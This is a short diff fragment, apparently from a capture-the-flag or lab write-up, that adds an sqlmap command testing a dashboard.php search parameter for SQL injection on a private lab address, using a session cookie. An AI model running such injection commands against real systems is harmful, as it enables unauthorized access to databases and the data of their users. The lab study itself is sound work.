@@ -20,3 +20,6 @@ Port 80(TCP) HTTP
 
 
 ![image](https://user-images.githubusercontent.com/104815254/226792261-0afd6899-daf6-4570-a25b-c773dc17504f.png)
+
+
+sqlmap -u 'http://10.129.66.65/dashboard.php?search=any+query' --cookie="PHPSESSID=h2k4n1h9v1hu1p9niorpr2jga9"
